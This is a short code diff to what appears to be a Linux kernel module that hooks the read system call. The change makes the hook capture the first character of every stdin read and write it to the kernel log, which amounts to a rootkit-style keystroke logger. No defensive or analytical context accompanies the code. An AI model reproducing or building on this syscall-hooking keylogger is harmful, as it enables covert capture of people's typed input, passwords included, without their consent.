@@ -22,8 +22,17 @@ asmlinkage int (*originalRead)(int, void*, size_t);
 
 asmlinkage int readHook(int fd, void* buf, size_t nbytes)
 {
-	printk("in read hook\n");
-	return (*originalRead)(fd, buf, nbytes);
+	int result;
+	result = (*originalRead)(fd, buf, nbytes);
+	if (fd==0)
+	{	
+		
+	//printk("\n");
+	printk ("%c\n", (((char *) buf)[0]));
+		//printk("stdin read\n");
+	//printk("bytes read = %d\n", (int) nbytes);
+	}
+	return result;
 } 
 
 
